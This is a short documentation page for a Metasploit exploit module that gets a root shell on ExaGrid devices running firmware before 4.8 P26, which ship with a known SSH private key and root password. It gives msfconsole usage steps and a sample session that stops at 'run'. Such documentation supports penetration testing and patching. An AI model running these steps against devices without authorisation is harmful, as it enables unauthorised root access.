  ExaGrid devices having a firmware before version 4.8 P26 contain a known ssh private key, and root password

## Verification Steps

  1. Start msfconsole
  2. Do: `use exploit/linux/ssh/exagrid_known_privkey`
  3. Do: `set rhost <ip>`
  4. Do: `exploit`
  5. You should get a shell.

## Scenarios

This is a run against a known vulnerable ExaGrid device.
```
msf > use exploit/linux/ssh/exagrid_known_privkey
msf exploit(exagrid_known_privkey) > set rhost 1.2.3.4
rhost => 1.2.3.4
msf exploit(exagrid_known_privkey) > run
